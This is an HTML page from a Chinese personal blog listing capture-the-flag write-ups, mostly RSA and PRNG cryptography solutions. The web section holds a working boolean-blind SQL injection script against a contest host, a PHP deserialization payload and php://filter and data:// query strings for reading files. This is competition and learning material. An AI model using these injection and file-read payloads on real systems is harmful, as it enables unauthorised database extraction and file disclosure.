+n = 1039344372165087100001063920598151812324151064684841845250974758525265148567706103784958424873181721352440209284812493753972556519482026327282644619091466886523804841248277210353173383407944598453848113815866908595335619458549486958764490103808475329598085842184963065068499489886467911087295087163762599284622055185456905774507245781667293199205317692029829495961487347944813874415423771980660778986211145841712412631156369129146470119135136378158203459576596246169191419488560832734046076107673091995860021863239882608638458149930255944184863801278386551031980146460231515747754411678651752698881001464973981424240781413084941947261875289725538959720572496329348499870580057997540844488309111059240745081048324762866572948371222839278718034435739827677190025500802453626872356208612718417249649474571197167076916403582394186357812640566250930361276229969553128128312736245440129556020108188835966131425956431796417720436474093381770796431629523054378258497546013222494974549262140415585158985940966415459478150722832119691308697510189026447359189994055885090735411738332296254011208547676914004864732327863884217733456287369771087094514708468685641820375220835485053482570852619363091173324203334503461823983610886849930944250553928855506012684504211525542998575275626784129736345142772399109273619522445919
+e = 65537
+c = 844677395496466411520394190869787261209960246734415406217975986418865760680024542119231873259131861208878522030009923057991526761346423130242121884493257732067700857897379859545356609151834223804262174935191718271211809221730601602827122249238086030580971376104724987801049500689134122609834321586609223761140538079460830213824674361601046367637227094018381901291488659642720549583856812747877519600804325570421770575999289389175021646347371879234023647657507178519047236746071420327155188213839293382288787853777540226192644761028822256165706787395891134765908229036044468473519166141610604791485071702808854944672418124203289328124793348198048601338476086482318248264508789781967910205393740835345086784345145351367491197717933757414967811594913692588314161669333147733048171044386546892346475181197482702164468542430187885074163177843285948999943328049159021873821254267471067523609151007885131921896462161216356454116929796355815756642621369974260365378070336290542971599886325232821981080341858950609157813769416455337935096696635623426418166316737131174435618543058086342714723330814586496030805366321181723292731710369013923285787724941830672247377301048663929453294620044701627159066468762709113137517559435822623284148112827473010030736329596829357275518641576798298066541516764673029908084962144713
+
+
+phi = p*(p-1)*q**2*(q-1)*r**4*(r-1)*s**6*(s-1)
+d = gmpy2.invert(e,phi)
+print(long_to_bytes(pow(c,d,n)))
+</code></pre>
+<h1 id="LitCTF-2023-yafu-中级"><a href="#LitCTF-2023-yafu-中级" class="headerlink" title="[LitCTF 2023]yafu (中级)"></a>[LitCTF 2023]yafu (中级)</h1><p><img src="https://img-blog.csdnimg.cn/889251124ed44ddaabf74a0103e5c0ed.png" alt="在这里插入图片描述"></p>
+<h1 id="AFCTF-2018-可怜的RSA"><a href="#AFCTF-2018-可怜的RSA" class="headerlink" title="[AFCTF 2018]可怜的RSA"></a>[AFCTF 2018]可怜的RSA</h1><p>n可分解<br>为什么不能用pow解<br>可以看3tefanie丶zhou师傅的wp</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/luochen2436/article/details/125872642"> https://blog.csdn.net/luochen2436/article/details/125872642</a></p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ff7d73">网络安全</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/python/" style="color: #ffa2c4">python</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #00a596">开发语言</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ff7d73">安全</a>
+        </span>
+        
+    </div>
+    <a href="/2023/06/02/NSS%E5%91%A8%E5%B8%B8%E5%88%B7%E5%AF%86%E7%A0%81(2)/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2023/05/23/2023%E5%A4%A9%E4%B8%80%E6%B0%B8%E5%AE%89%E6%9D%AFrsa%E5%A4%8D%E7%9B%98/">
+        <h2 class="post-title">2023天一永安杯rsa复盘</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/5/23
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="原题"><a href="#原题" class="headerlink" title="原题"></a>原题</h1><pre><code class="c">from Crypto.Util.number import *
+from math import gcd
+from secret import flag
+
+def gen_key(nbits, gamma):
+    g = getPrime(int(nbits * gamma)) 
+    alpha = 0.5 - gamma
+    while True:
+        a = getPrime(int(alpha * nbits))
+        p = 2 * g * a + 1 
+        if isPrime(p):
+            break
+    while True:
+        b = getRandomNBitInteger(int(alpha * nbits))
+        q = 2 * g * b + 1
+        h = 2 * g * a * b + a + b
+        if isPrime(q) and isPrime(h) and gcd(a, b) == 1:
+            return p*q,a,g
+        else:
+            continue
+        
+n,a,g = gen_key(1024, 0.05)
+e = 65537
+c = pow(bytes_to_long(flag),e,a*g)
+print(n,c,a)
+
+&#39;&#39;&#39;
+n=36535558847082719901201561031181835346574576610950713924924272947759193576365817762980927638691696601293089537315055413746788190208875234794229119049056299551864869870291634941246362436491006904347559559494705922259007299126640817275929491680601926404543198957206717290905220235571289759182878331893962038379
+c=532997872940452282189043430008002793694788439822465302532208754231005799057972378308576109082463996551992533174546386979606697890310597738637156771564229
+a=2694858406312563434474553988904403597551484373358339092528913028454100111881368126493990657117571672510331411186745639563619323775673115439
+&#39;&#39;&#39;
+</code></pre>
+<h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><p>其实挺简单的,当初一看500分,觉得不是我能动的题,下来复盘了一下后悔没细看</p>
+<p>过程如下<br><code>p*q = 2g(a+b) + 4ab*g**2 +1 </code><br>而<code>a+b+2gab == h</code><br>化简得到<br><code>p*q-1 = 2gh</code></p>
+<p>本题的公钥是<code>(e,a*g)</code><br>我们可以考虑用<code>p*q-1 = 2gh</code><br>分解得到g<br><code>n = (n-1) // 2</code></p>
+<p>因为g是<code>51位</code>的<br>h是约为<code>972位</code>的<br>相差很大可以用yafu分解或者factordb查一下<br>得到</p>
+<pre><code class="c">g = 1346104232461691
+
+h = 13570850594633462506426369052182298554140635599543685835372377476383038708650421475723391142118956001358520246769650699398490037618758005241062608387057439283872260149565854577827352267289963736282502923131251179400580891491236925451166755184695335564693793568286112036468975877609637392241679
+</code></pre>
+<p>于是脚本如下</p>
+<pre><code class="python">from Crypto.Util.number import *
+import gmpy2
+
+c = 532997872940452282189043430008002793694788439822465302532208754231005799057972378308576109082463996551992533174546386979606697890310597738637156771564229
+a = 2694858406312563434474553988904403597551484373358339092528913028454100111881368126493990657117571672510331411186745639563619323775673115439
+g = 1346104232461691
+e = 65537
+
+d = gmpy2.invert(e,(g-1)*(a-1))
+print(long_to_bytes(pow(c,d,a*g)))
+# b&#39;flag&#123;p01la4d_rHo_a1gOr1thM_r1gh4&#125;&#39;
+</code></pre>
+<p>后来做到了羊城杯2021的一道类似的rsa<br>才知道这是<code>Common Prime RSA</code><br>常见的攻击方法有<br>1.修改Pollard’s rho方法分解n<br>2.知道a,b<br>3.知道g<br>4.分解n-1</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>痛失线下赛,要哭哭惹</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/" style="color: #ff7d73">数学建模</a>
+        </span>
+        
+    </div>
+    <a href="/2023/05/23/2023%E5%A4%A9%E4%B8%80%E6%B0%B8%E5%AE%89%E6%9D%AFrsa%E5%A4%8D%E7%9B%98/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2023/05/22/2023%E5%A4%A9%E4%B8%80%E6%B0%B8%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86wp/">
+        <h2 class="post-title">2023天一永安杯部分wp</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/5/22
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h2><p>布尔盲注</p>
+<pre><code class="python">import requests
+import string
+
+dictionary = string.digits+string.ascii_letters+&quot;_-&#123;,&#125;&quot;
+url = &quot;http://cd5a2660b462c867.node.nsctf.cn/login.php&quot;
+xxx=&quot;&quot;
+for i in range(1,666):
+    print(&quot;正在爆破第&#123;&#125;位&quot;.format(i))
+    for j in dictionary:
+        flag = True
+        
+        # payload = &quot;admin&#39;and substr((select group_concat(schema_name) from information_schema.schemata),&#123;&#125;,1) = binary&#39;&#123;&#125;&#39; #&quot;.format(i,j)  
+        # payload = &quot;admin&#39;and substr((select group_concat(table_name) from information_schema.tables where table_schema = &#39;ctf&#39;),&#123;&#125;,1) = &#39;&#123;&#125;&#39; #&quot;.format(i,j)              
+        # payload = &quot;admin&#39;and substr((select group_concat(column_name) from information_schema.columns where table_schema = &#39;ctf&#39; and table_name = &#39;f111&#39;),&#123;&#125;,1) = &#39;&#123;&#125;&#39; #&quot;.format(i,j)              
+        payload = &quot;admin&#39;and substr((select group_concat(flagdata) from ctf.f111),&#123;&#125;,1) = &#39;&#123;&#125;&#39; #&quot;.format(i,j)              
+
+        data = &#123;&#39;password&#39;:&#39;admin&#39;,&#39;username&#39;:payload&#125;
+        res = requests.post(url=url,data=data)
+
+        if (&#39;admin&#39; in res.text):
+            xxx += j
+            print(xxx)
+            flag = False
+            break
+    if(flag):
+        print(xxx)
+        break
+</code></pre>
+<h2 id="Deserialization"><a href="#Deserialization" class="headerlink" title="Deserialization"></a>Deserialization</h2><p>伪协议读源码</p>
+<p>route.php</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/d01ad9ca8d2e7da82cf71d2b907aa258.png" alt="image-20230520130408427"></p>
+<p>h1nt.php</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/f00204ef3a75d5f39fe8b86f06b56452.png" alt="image-20230520130421846"></p>
+<p>构造</p>
+<pre><code class="php">&lt;?php
+class test
+&#123;
+    public $position = &#39;f14g.php&#39;;
+    public function __clone()&#123;  
+        echo file_get_contents($this-&gt;position); 
+        return $this-&gt;position;
+    &#125;
+&#125;  
+$a = new test();
+echo urlencode(serialize($a));
+</code></pre>
+<p>然后在index.php包含h1nt.php</p>
+<pre><code>read=h1nt.php&amp;input=O%3A4%3A%22test%22%3A1%3A%7Bs%3A8%3A%22position%22%3Bs%3A8%3A%22f14g.php%22%3B%7D
+</code></pre>
+<h2 id="CodeCheck"><a href="#CodeCheck" class="headerlink" title="CodeCheck"></a>CodeCheck</h2><p>这里利用data协议使得get_file_content返回的值为flag</p>
+<pre><code>?a=data://text/plain,flag&amp;b=data://text/plain,flag&amp;c=flag&amp;d=php://filter//convert.iconv.SJIS*.UCS-4*/resource=index.php
+</code></pre>
+<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="secret"><a href="#secret" class="headerlink" title="secret"></a>secret</h2><p>e phi 不互素</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/15960561067d54be25329549f37a1ee4.png" alt="image-20230520133647746"></p>
+<h2 id="流哇流"><a href="#流哇流" class="headerlink" title="流哇流"></a>流哇流</h2><p>flag2</p>
+<pre><code class="python">from sympy import *
+from gmpy2 import *
+from functools import reduce
+from primefac import *
+def egcd(a, b):
+    if a == 0:
+        return (b, 0, 1)
+    else:
+        g, y, x = egcd(b % a, a)
+        return (g, x - (b // a) * y, y)
+def modinv(a, m):
+    g, x, y = egcd(a, m)
+    if g != 1:
+        raise Exception(&#39;modular inverse does not exist&#39;)
+    else:
+        return x % m
+def crack_unknown_increment(states, modulus, multiplier): 
+    increment = (states[1] - states[0]*multiplier) % modulus 
+    return modulus, multiplier, increment
+def crack_unknown_multiplier(states, modulus):    
+    multiplier = (states[2] - states[1]) * modinv(states[1] - states[0], modulus) % modulus 
+    return crack_unknown_increment(states, modulus, multiplier)
+
+def crack_unknown_modulus(states): 
+    diffs = [s1 - s0 for s0, s1 in zip(states, states[1:])] 
+    zeroes = [t2*t0 - t1*t1 for t0, t1, t2 in zip(diffs, diffs[1:], diffs[2:])] 
+    modulus = abs(reduce(gcd, zeroes)) 
+    return crack_unknown_multiplier(states, modulus)
+
+states = [7762911616316678361, 8778349545254661087, 2182563361653435704, 1383751637647655272, 4512576578889812021, 4322633144718249958, 3959701111371594748, 7676663421477866678, 5009230933212388616, 3780469426700690705]
+seed = 6473702802409947663
+modulus, multiplier, increment =crack_unknown_modulus(states)
+print(modulus)   #9223372036854775783
+print(multiplier)   # 672257317069504228
+print(increment) #0
+</code></pre>
+<p>flag1找到类似的原题了,ciscn的</p>
+<p>直接改改数值套脚本</p>
+<pre><code class="python">key = &#39;11110010001101101001001110001001&#39;
+mask = &#39;10100100000010000000100010010100&#39;
+ 
+R = &#39;&#39;
+tem = key
+for i in range(32):
+    output = &#39;?&#39; + key[:31]
+    ans = int(tem[-1-i]) ^ int(output[-3]) ^ int(output[-5]) ^ int(output[-8]) ^ int(output[-12]) ^ int(output[-20]) ^ int(output[-27]) ^ int(output[-30])
+    R += str(ans)
+    key = str(ans) + key[:31]
+ 
+# R = format(int(R[::-1],2),&#39;z&#39;)
+R = str(hex(int(R[::-1],2))[2:])
+print(R)
+</code></pre>
+<pre><code class="python">flag2 = 9223372036854775783
+# flag1 = 0x81415720
+flag1 = 2168543008
+flag = &#39;81415720&#39;+str(flag2)
+print(hashlib.md5(flag.encode(&quot;utf-8&quot;)).hexdigest())
+</code></pre>
+<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h2><p>爆破密码01组成的9位</p>
+<p>然后解压得到flag</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/cd2b8c4828c69e7d98fd075cdc1a763d.png" alt="image-20230520133753893"></p>
+<h2 id="SimpleDocument"><a href="#SimpleDocument" class="headerlink" title="SimpleDocument"></a>SimpleDocument</h2><p><img src="https://img-blog.csdnimg.cn/img_convert/54606980448d92c26f0fe643e9137b46.png" alt="image-20230520133905424"></p>
+<p>foremost 抽出pdf 全选复制得到flag</p>
+<h2 id="BeautifulImage"><a href="#BeautifulImage" class="headerlink" title="BeautifulImage"></a>BeautifulImage</h2><p><img src="https://img-blog.csdnimg.cn/img_convert/4e23291ee711087bf6bc4315e8648cf2.png" alt="image-20230520133831529"></p>
+<p>zsteg 出base64 解码得flag</p>
+<h1 id="mobile"><a href="#mobile" class="headerlink" title="mobile"></a>mobile</h1><h2 id="peacock"><a href="#peacock" class="headerlink" title="peacock"></a>peacock</h2><p>dex2jar</p>
+<p>看了看jar包没什么东西,那么核心应该在so里</p>
+<p>ida看so文件</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/7c97834bb931d58cb735a3b046941f0c.png" alt="image-20230520131457608"></p>
+<p>感觉最后那两个字符串像base64</p>
+<p>然后考虑base64换表,表就是下面那个,解得flag</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>妈的应该是阳了,头巨痛,还得好好学,输出太低了</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #03a9f4">开发语言</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/" style="color: #ff7d73">数学建模</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/php/" style="color: #00bcd4">php</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/linux/" style="color: #ff7d73">linux</a>
+        </span>
+        
+    </div>
+    <a href="/2023/05/22/2023%E5%A4%A9%E4%B8%80%E6%B0%B8%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86wp/" class="go-post">阅读全文</a>
+</div>
+
+
+        <div class="page-current">
+    
+    <a class="page-num" href="/page/3/">
+        <i class="fa-solid fa-caret-left fa-fw"></i>
+    </a>
+    <a class="page-num" href="/">1</a>
+    <span class="page-omit">...</span>
+    
+    <span class="current">4</span>
+    
+    <a class="page-num" href="/page/5">5</a>
+    
+    
+    <a class="page-num" href="/page/6">6</a>
+    
+    
+    
+    <a class="page-num" href="/page/5/">
+        <i class="fa-solid fa-caret-right fa-fw"></i>
+    </a>
+    
+</div>
+
+    </div>
+    
+    <div id="home-card">
+        <div id="card-style">
+    <div id="card-div">
+        <div class="avatar">
+            <img src="/images/Arcueid.jpg" alt="avatar" />
+        </div>
+        <div class="name">Arcueid</div>
+        <div class="description">
+            <p>Web + Crypto 苦手</p>
+
+        </div>
+        
+        
+    </div>
+</div>
+
+    </div>
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 Arcueid&#39;s BLOG
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;Arcueid
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+</body>
+</html>
